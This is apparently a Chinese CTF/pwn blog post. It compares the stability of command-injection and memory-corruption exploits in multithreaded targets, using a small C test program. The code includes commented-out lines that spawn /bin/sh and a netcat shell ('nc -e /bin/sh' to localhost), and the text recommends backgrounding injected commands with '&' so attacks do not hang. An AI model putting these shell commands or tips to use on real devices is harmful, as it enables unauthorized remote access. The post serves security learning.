---
title: Getshell稳定：命令注入 > 内存破坏
date: 2020-12-13 00:00:00
categories:
- CTF/Pwn
tags: 
---

> 不要瞧不起命令注入，因为你不得不承认，命令注入型漏洞就是要比内存破坏型漏洞要稳。在实际的攻击中，我们发现的漏洞代码的运行实体可能是单蹦儿的一个进程，也可能是某个进程的一个线程。如果攻击发生在某个线程中，对其他线程，以及线程所属的进程会不有影响呢？在这种情况下，内存破坏漏洞的表现怎么样呢？

使用如下测试代码，每次可以打开其中一个注释：

```
➜  gcc test.c -lpthread -o test && ./test
```

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>

void *thread1(void *arg){
//    system("/bin/sh");
//    system("/bin/sh &");
//    system("nc -e /bin/sh 127.0.0.1 8888");
//    system("nc -e /bin/sh 127.0.0.1 8888 &")
    while(1){
        printf("thread1         is running\n");
        sleep(1);
    }
}

void *thread2(void *arg){
//    execve("/bin/sh",NULL,NULL);
    while(1){
        printf("thread2         is running\n");
        sleep(1);
    }
}

int main(){
    getchar();
    pthread_t thid1,thid2;
    pthread_create(&thid1,NULL,(void*)thread1,NULL);
    pthread_create(&thid2,NULL,(void*)thread2,NULL);
//    int a = *(int *)0;
    while(1){
        printf("main thread     is running\n");
        sleep(1);
    }
    return 0;
}
```


1. 内存破坏无论发生在哪个线程中，若触发SIGSEGV，整个进程就会崩溃，并且一般程序不会注册SIGSEGV的信号处理函数
2. system函数命令注入，可能会使得被攻击的线程卡住，其他线程正常运行，因为system函数会等待其执行命令的返回。

在实际攻击中，我们发现用命令注入的漏洞攻击某设备的某个进程，无论我的exp是否有失误，设备不用重启，漏洞进程不会被打崩溃，也不会卡死。（这事在Web手看起来不是理所当然的么！）

至于原因当然和Web手攻击的情景是一样的，就像apache，会为连进来的请求建立新的进程。或者像CTF中Pwn题的部署方式，即socat和xinetd。分析发现，我们的每次攻击都是在目标进程新启动的线程中触发的，所以大不了就是这个线程卡死，再次攻击又是一个新的线程。并且开发在写线程的时候，为的就是卡死没事，这种情景在网络数据处理的时候会很常见。所以为了避免system函数卡死，拼接进去的命令注入可以让其在后台运行(&)，这样system函数即可马上返回，也不影响被攻击的线程。

但是如果漏洞类型是内存破坏漏洞，即使他出现在某个线程里，只要你稍不留神，触发了SIGSEGV，整个进程就完蛋了。如果该进程没有守护进程让他再次等待被你攻击，那也就只有重启设备了。